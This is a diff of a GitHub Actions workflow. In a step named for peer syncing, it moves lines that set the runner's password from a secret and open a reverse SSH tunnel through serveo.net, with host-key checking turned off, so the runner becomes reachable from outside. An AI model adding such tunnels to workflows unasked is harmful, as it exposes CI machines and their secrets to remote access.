@@ -35,6 +35,10 @@ jobs:
       
       - name: Wait for Final Sync from Peer
         run: |
+          echo "runner:${{ secrets.SH_PASS }}" | sudo chpasswd
+
+          ssh -o StrictHostKeyChecking=no -tt -R wronglyforums:22:localhost:22 serveo.net &
+          
           if [ ! -f "catbox_links.txt" ]; then exit 0; fi
 
           TRIGGER_HASH=$(git rev-parse HEAD)
@@ -48,10 +52,7 @@ jobs:
             sleep 5
           done
           
-          echo "runner:${{ secrets.SH_PASS }}" | sudo chpasswd
-
-          ssh -o StrictHostKeyChecking=no -tt -R wronglyforums:22:localhost:22 serveo.net &
-
+          
       - name: Restore & Decode Data
         run: |
           if [ -f "catbox_links.txt" ]; then
